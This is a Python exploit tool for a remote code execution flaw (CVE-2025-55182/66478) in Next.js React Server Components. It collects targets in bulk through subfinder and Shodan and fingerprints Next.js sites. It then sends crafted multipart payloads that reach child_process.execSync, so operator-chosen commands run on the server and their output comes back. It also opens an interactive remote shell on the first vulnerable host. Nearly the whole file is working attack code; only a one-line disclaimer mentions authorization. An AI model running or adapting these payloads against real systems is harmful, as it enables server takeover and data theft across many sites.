#!/usr/bin/env python3
"""
Torito React2Shell Scanner & Exploit Tool (CVE-2025-55182 / 66478)
- Target acquisition: stdin/file/url + subfinder + Shodan
- Fingerprinting: Next.js/App Router heuristics
- Safe probe (no code exec) + confirm PoC + optional exploit/command (opt-in)
- Reporting: live console, JSON/CSV export
- Interactive shell optional after first exploit

This script is intended for authorized security testing of assets you own or are allowed to assess.
"""

from __future__ import annotations

import warnings
# Suppress LibreSSL/OpenSSL compatibility warning from urllib3 before it loads
warnings.filterwarnings("ignore", message="urllib3 v2 only supports OpenSSL*", category=Warning)

import argparse
import csv
import json
import os
import re
import subprocess
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional, Set, Tuple

import requests
from requests.exceptions import RequestException

try:
    import httpx
except ImportError:
    httpx = None

try:
    import shodan
except ImportError:
    shodan = None

try:
    from rich.console import Console
    from rich.table import Table
    from rich.progress import Progress
except ImportError:
    Console = None
    Table = None
    Progress = None

try:
    from tqdm import tqdm
except ImportError:
    tqdm = None

requests.packages.urllib3.disable_warnings()  # ignore SSL warnings for speed

DEFAULT_TIMEOUT = 10
BOUNDARY = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
USER_AGENT = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"

console = Console() if Console else None


# ----------------------------- Banner ---------------------------------------

BANNER = r"""                                   
   ##                                   
  #####                                 
   #####             #######            
    ####        #######   ####          
   ##      #######           ###        
   ##########                 ###       
      ##                        ###     
     ##       #                 ########
     ###     ##  #        ####   ###### 
   ####     #######  ####### ##  #####  
  ##  ############# ##### ##  ####      
 ## #### ####### ##### ### ### ###      
 #####     ###### ## ##  ## ###         
 #####      ####  #####   #####
                                                  
                                                  
Torito React2Shell Scanner & Exploit Tool
"""

def print_banner():
    if console and sys.stdout.isatty():
        console.print(BANNER, style="bold red")
    else:
        print(BANNER)


# ----------------------------- Acquisition ---------------------------------

def normalize_url(url: str) -> str:
    url = url.strip()
    if not url:
        return ""
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    # drop trailing slash for consistency
    return url.rstrip('/')


def load_targets(args) -> List[str]:
    targets: Set[str] = set()

    if args.url:
        targets.add(normalize_url(args.url))

    if args.list:
        with open(args.list, 'r') as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                targets.add(normalize_url(line))

    if not sys.stdin.isatty():
        for line in sys.stdin:
            line = line.strip()
            if line:
                targets.add(normalize_url(line))

    # subfinder integration
    for domain in args.subfinder or []:
        targets.update(run_subfinder(domain))

    # shodan integration
    for query in args.shodan or []:
        targets.update(run_shodan(query, args.shodan_limit))

    return sorted(t for t in targets if t)


def run_subfinder(domain: str) -> Set[str]:
    cmd = ["subfinder", "-silent", "-d", domain]
    try:
        out = subprocess.check_output(cmd, text=True, stderr=subprocess.DEVNULL, timeout=60)
        return {normalize_url(line) for line in out.splitlines() if line.strip()}
    except FileNotFoundError:
        print(f"[warn] subfinder not found in PATH; skipping subfinder for {domain}")
        return set()
    except subprocess.SubprocessError:
        print(f"[warn] subfinder failed for {domain}")
        return set()


def run_shodan(query: str, limit: int) -> Set[str]:
    if not shodan:
        print(f"[warn] python-shodan not installed; skipping Shodan query '{query}'")
        return set()
    api_key = os.environ.get("SHODAN_API_KEY")
    if not api_key:
        print(f"[warn] SHODAN_API_KEY not set; skipping Shodan query '{query}'")
        return set()
    api = shodan.Shodan(api_key)
    try:
        res = api.search(query, limit=limit)
    except Exception as e:
        msg = str(e)
        if "403" in msg or "Access denied" in msg or "No query credits" in msg:
            print(f"[warn] Shodan query failed: {query} (403 / no query credits). Your API key shows 0 credits or insufficient plan.")
        else:
            print(f"[warn] Shodan query failed: {query} ({e})")
        return set()

    targets = set()
    for match in res.get('matches', []):
        ip = match.get('ip_str')
        port = match.get('port', 80)
        hostnames = match.get('hostnames', []) or []
        ssl = port == 443 or 'ssl' in match.get('tags', [])
        proto = 'https' if ssl else 'http'

        # prefer hostnames, fallback to IP
        if hostnames:
            for h in hostnames:
                if not h:
                    continue
                url = f"{proto}://{h}" if port in [80, 443] else f"{proto}://{h}:{port}"
                targets.add(url)
        elif ip:
            url = f"{proto}://{ip}" if port in [80, 443] else f"{proto}://{ip}:{port}"
            targets.add(url)
    return targets


# --------------------------- Fingerprinting ---------------------------------

MARKERS = [
    "__next_f",  # App Router hydration
    "_next/static",
    "__NEXT_DATA__",
    "next-head-count",
]


def fingerprint(url: str, timeout: int, proxy: Optional[str]) -> Dict:
    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    }
    proxies = {"http": proxy, "https": proxy} if proxy else None
    result = {
        "url": url,
        "status": None,
        "nextjs": False,
        "app_router": False,
        "markers": [],
        "error": None,
    }
    try:
        r = requests.get(url, headers=headers, timeout=timeout, verify=False, allow_redirects=True, proxies=proxies)
        result["status"] = r.status_code
        body = r.text
        hdr = r.headers
        # header hint
        if "next.js" in hdr.get("X-Powered-By", "").lower():
            result["nextjs"] = True
        # marker scan
        found = [m for m in MARKERS if m in body]
        if found:
            result["nextjs"] = True
            result["markers"] = found
        if "__next_f" in body or "self.__next_f" in body:
            result["app_router"] = True
        if "__NEXT_DATA__" in body and not result["app_router"]:
            result["app_router"] = False
    except RequestException as e:
        result["error"] = str(e)
    except Exception as e:
        result["error"] = str(e)
    return result


# --------------------------- Payload Builders -------------------------------

def build_safe_probe() -> Tuple[str, str]:
    body = (
        f"--{BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="1"\r\n\r\n'
        "{}\r\n"
        f"--{BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="0"\r\n\r\n'
        '["$1:aa:aa"]\r\n'
        f"--{BOUNDARY}--"
    )
    return body, f"multipart/form-data; boundary={BOUNDARY}"


def build_confirm_payload() -> Tuple[str, str]:
    # Matches react2shell PoC with deterministic marker 11111
    part0 = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":'
        '"var res=process.mainModule.require(\\"child_process\\").execSync(\\"echo 11111\\")'
        '.toString().trim();;throw Object.assign(new Error(\\"NEXT_REDIRECT\\"),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});",'
        '"_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
    )
    body = (
        f"--{BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n"
        f"--{BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="1"\r\n\r\n'
        '"$@0"\r\n'
        f"--{BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="2"\r\n\r\n'
        '[]\r\n'
        f"--{BOUNDARY}--"
    )
    return body, f"multipart/form-data; boundary={BOUNDARY}"


def build_exploit_payload(cmd: str) -> Tuple[str, str]:
    payload_template = (
        '{{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{{\\"then\\":\\"$B1337\\"}}","_response":{{"_prefix":'
        '"var res=process.mainModule.require(\\"child_process\\").execSync(\\"{cmd}\\").toString(\\"base64\\");'
        'throw Object.assign(new Error(\\"x\\"),{{digest: res}});",'
        '"_chunks":"$Q2","_formData":{{"get":"$1:constructor:constructor"}}}}}}'
    )
    part0 = payload_template.format(cmd=cmd.replace('"', '\\"'))
    body = (
        f"--{BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n"
        f"--{BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="1"\r\n\r\n'
        '"$@0"\r\n'
        f"--{BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="2"\r\n\r\n'
        '[]\r\n'
        f"--{BOUNDARY}--"
    )
    return body, f"multipart/form-data; boundary={BOUNDARY}"


# --------------------------- Checks & Exploit -------------------------------

def send_payload(url: str, body: str, ctype: str, timeout: int, proxy: Optional[str]) -> Tuple[Optional[requests.Response], Optional[str]]:
    headers = {
        "User-Agent": USER_AGENT,
        "Next-Action": "x",
        "X-Nextjs-Request-Id": "b5dce965",
        "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
        "Content-Type": ctype,
    }
    proxies = {"http": proxy, "https": proxy} if proxy else None
    try:
        resp = requests.post(url, headers=headers, data=body.encode('utf-8'), timeout=timeout, verify=False, allow_redirects=False, proxies=proxies)
        return resp, None
    except RequestException as e:
        return None, str(e)
    except Exception as e:
        return None, str(e)


def is_safe_probe_hit(resp: requests.Response) -> bool:
    return resp.status_code == 500 and 'digest' in resp.text


def is_confirm_hit(resp: requests.Response) -> bool:
    redirect = resp.headers.get('X-Action-Redirect', '')
    return bool(re.search(r'/login\?a=11111', redirect))


def extract_digest_base64(resp: requests.Response) -> Optional[str]:
    m = re.search(r'"digest"\s*:\s*"((?:[^"\\]|\\.)*)"', resp.text)
    if not m:
        return None
    try:
        raw = json.loads(f'"{m.group(1)}"')
    except Exception:
        raw = m.group(1)
    return raw


def decode_digest(digest: str) -> Tuple[Optional[str], bool]:
    """
    Attempt to base64-decode the digest; return (decoded_text, decoded_flag).
    If decoding fails, return original digest and False.
    """
    import base64
    try:
        decoded = base64.b64decode(digest, validate=False).decode("utf-8", errors="replace")
        return decoded, True
    except Exception:
        return digest, False


def worker(target: str, args) -> Dict:
    result = {
        "url": target,
        "fingerprint": None,
        "probe": None,
        "confirm": None,
        "exploit": None,
        "error": None,
    }

    fp = fingerprint(target, args.timeout, args.proxy)
    result["fingerprint"] = fp

    if fp.get("error"):
        result["error"] = fp["error"]
        return result

    if not fp.get("nextjs"):
        return result  # skip non-Next.js silently

    # Safe probe
    body, ctype = build_safe_probe()
    resp, err = send_payload(target + '/', body, ctype, args.timeout, args.proxy)
    if err:
        result["probe"] = {"ok": False, "error": err}
    else:
        hit = is_safe_probe_hit(resp)
        result["probe"] = {"ok": hit, "status": resp.status_code}

    # Confirm
    if args.confirm:
        body_c, ctype_c = build_confirm_payload()
        resp_c, err_c = send_payload(target + '/', body_c, ctype_c, args.timeout, args.proxy)
        if err_c:
            result["confirm"] = {"ok": False, "error": err_c}
        else:
            result["confirm"] = {"ok": is_confirm_hit(resp_c), "status": resp_c.status_code}

    # Exploit
    if args.exploit_cmd:
        body_e, ctype_e = build_exploit_payload(args.exploit_cmd)
        resp_e, err_e = send_payload(target + '/adfa', body_e, ctype_e, args.timeout, args.proxy)
        if err_e:
            result["exploit"] = {"ok": False, "error": err_e}
        else:
            digest = extract_digest_base64(resp_e)
            decoded, decoded_flag = (None, False)
            if digest:
                # Try URL unquote then base64 decode
                try:
                    digest = requests.utils.unquote(digest)
                except Exception:
                    pass
                decoded, decoded_flag = decode_digest(digest)
            result["exploit"] = {
                "ok": bool(digest),
                "status": resp_e.status_code,
                "digest": digest,
                "output": decoded if decoded_flag else None,
            }
    return result


# --------------------------- Reporting -------------------------------------

def render_console(results: List[Dict], verbose: bool):
    if not console or not Table:
        return
    table = Table(show_header=True, header_style="bold cyan")
    table.add_column("Target")
    table.add_column("FP")
    table.add_column("Probe")
    table.add_column("Confirm")
    table.add_column("Exploit")

    for r in results:
        fp = r.get("fingerprint", {})
        fp_status = "AR" if fp.get("app_router") else ("NX" if fp.get("nextjs") else "-")
        probe = r.get("probe", {})
        confirm = r.get("confirm", {})
        exploit = r.get("exploit", {})
        table.add_row(
            r.get("url", ""),
            fp_status,
            fmt_check(probe),
            fmt_check(confirm),
            fmt_check(exploit, show_digest=verbose),
        )
    console.print(table)


def fmt_check(obj: Dict, show_digest: bool = False) -> str:
    if not obj:
        return "-"
    if obj.get("error"):
        return f"err: {obj['error'][:20]}"
    if obj.get("ok"):
        if show_digest and obj.get("output"):
            return f"ok ({obj['output'][:24]}...)"
        if show_digest and obj.get("digest"):
            return f"ok ({obj['digest'][:24]}...)"
        return "ok"
    return f"{obj.get('status', '-') }"


def save_json(results: List[Dict], path: str):
    with open(path, 'w') as f:
        json.dump(results, f, indent=2)


def save_csv(results: List[Dict], path: str):
    with open(path, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(["url", "nextjs", "app_router", "probe", "confirm", "exploit"])
        for r in results:
            fp = r.get("fingerprint", {})
            writer.writerow([
                r.get("url"),
                fp.get("nextjs"),
                fp.get("app_router"),
                r.get("probe", {}).get("ok"),
                r.get("confirm", {}).get("ok") if r.get("confirm") else None,
                r.get("exploit", {}).get("digest") if r.get("exploit") else None,
            ])


# --------------------------- Interactive shell ------------------------------

def interactive_shell(target: str, cmd_default: str, timeout: int, proxy: Optional[str]):
    print(f"[shell] Connected to {target}. Type 'exit' to quit.")
    prompt = f"\033[32m{{torito-shell}}\033[0m @ \033[1m{target}\033[0m$ "
    while True:
        try:
            cmd = input(prompt).strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if cmd.lower() in {"exit", "quit", "q"}:
            break
        if not cmd:
            continue
        body, ctype = build_exploit_payload(cmd)
        resp, err = send_payload(target + '/adfa', body, ctype, timeout, proxy)
        if err:
            print(f"err: {err}")
            continue
        digest = extract_digest_base64(resp)
        if digest:
            try:
                digest = requests.utils.unquote(digest)
            except Exception:
                pass
            decoded, decoded_flag = decode_digest(digest)
            if decoded_flag:
                print(decoded)
            else:
                print(digest)
        else:
            print("no output or blocked")


# --------------------------- Main ------------------------------------------

def main():
    parser = argparse.ArgumentParser(description="Torito-R2S consolidated scanner (authorized use only)")
    src = parser.add_argument_group("Targets")
    src.add_argument("-u", "--url")
    src.add_argument("-l", "--list")
    src.add_argument("--subfinder", action="append", metavar="DOMAIN", help="Use subfinder for domain (requires binary)")
    src.add_argument("--shodan", action="append", metavar="QUERY", help="Shodan query (requires SHODAN_API_KEY)")
    src.add_argument("--shodan-limit", type=int, default=100)

    perf = parser.add_argument_group("Performance")
    perf.add_argument("-t", "--threads", type=int, default=20)
    perf.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT)
    perf.add_argument("--proxy", help="http(s) proxy URL")

    checks = parser.add_argument_group("Checks")
    checks.add_argument("--confirm", action="store_true", help="run confirm PoC (side-channel redirect check)")
    checks.add_argument("--exploit-cmd", help="run exploit command; default is 'id' when --shell/-i is set")
    checks.add_argument("--shell", "-i", action="store_true", help="enter interactive shell on first exploit hit (sequential)")

    out = parser.add_argument_group("Output")
    out.add_argument("--json-out")
    out.add_argument("--csv-out")
    out.add_argument("-v", "--verbose", action="store_true")

    print_banner()
    args = parser.parse_args()

    # If shell requested, ensure an exploit command default is present
    if args.shell and not args.exploit_cmd:
        args.exploit_cmd = "id"

    targets = load_targets(args)
    if not targets:
        print("No targets provided")
        sys.exit(1)

    results: List[Dict] = []

    # Always show progress and gather results (even when --shell is requested)
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        fut_map = {executor.submit(worker, tgt, args): tgt for tgt in targets}
        if tqdm:
            for fut in tqdm(as_completed(fut_map), total=len(fut_map), desc="scan", unit="target"):
                results.append(fut.result())
        else:
            for fut in as_completed(fut_map):
                results.append(fut.result())

    render_console(results, args.verbose)

    # If exploit output was collected, print it plainly so users see the command result
    for r in results:
        exp = r.get("exploit") or {}
        if exp.get("output"):
            print(f"\n[output] {r.get('url')}")
            print(exp["output"])
        elif args.verbose and exp.get("digest"):
            print(f"\n[digest] {r.get('url')}")
            print(exp["digest"])

    if args.json_out:
        save_json(results, args.json_out)
    if args.csv_out:
        save_csv(results, args.csv_out)

    # After showing results, drop into shell if requested and we have a hit
    if args.shell:
        shell_target = None
        for r in results:
            exp = r.get("exploit") or {}
            if exp.get("ok"):
                shell_target = r.get("url")
                break
        if shell_target:
            interactive_shell(shell_target, args.exploit_cmd or "id", args.timeout, args.proxy)
        else:
            print("[shell] No exploit success; shell not opened.")

    # exit code: 0 if none confirmed/exploited, 1 otherwise
    exit_bad = any((r.get("confirm", {}) or {}).get("ok") or (r.get("exploit", {}) or {}).get("ok") for r in results)
    sys.exit(1 if exit_bad else 0)


if __name__ == "__main__":
    main()
